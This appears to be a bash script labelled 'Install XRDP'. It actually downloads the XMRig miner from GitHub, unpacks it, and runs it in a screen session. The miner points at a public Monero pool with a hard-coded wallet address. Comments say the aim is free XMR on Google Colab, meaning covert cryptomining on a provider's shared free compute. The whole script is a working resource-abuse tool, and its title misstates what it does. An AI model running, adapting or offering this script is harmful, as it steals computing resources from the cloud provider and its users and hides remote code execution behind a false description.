# test2
#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 8AxRZnKabcA53rC7YEvUdLY95NBKAodWndqr1gPGN5tdT6CCDWS5d8ZJ1QVsqmWU8Dc3ZFQegVrBufgw1T1aU3cQVd2c7X5 -k --tls --rig-id GC-US
